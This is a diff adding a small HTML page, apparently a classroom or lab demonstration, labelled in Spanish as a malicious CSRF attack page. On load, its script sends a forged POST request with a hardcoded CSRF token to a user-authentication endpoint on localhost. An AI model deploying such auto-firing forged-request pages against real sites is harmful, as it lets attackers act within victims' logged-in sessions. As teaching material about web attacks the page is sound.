@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Example attack csrf</title>
+</head>
+<body>
+
+    <h1>Página maliciosa ataque CSRF</h1>
+
+    <img src="https://static.retail.autofact.cl/blog/c_img_740x370.fqrji8l39f4gkn.jpg">
+
+    
+</body>
+<script type="module">
+ 
+  
+    
+    const getList = await fetch(`http://localhost:3000/api/v1/usuarios/auth/`, {
+      method: "POST",
+      headers: {
+        "x-csrf-token": '8a2d86b17fabb98e0153d7c620a4d65a5cb1f6c6a50827d70cdff17a97234974b26ee50e5cbccad8794686a5b354b0af90604bbb158a65a371c6ac60b1ad1936',
+        "Content-Type": "application/json",
+      }
+    }).then((data) => console.log(data));
+   
+  </script>
+</html>
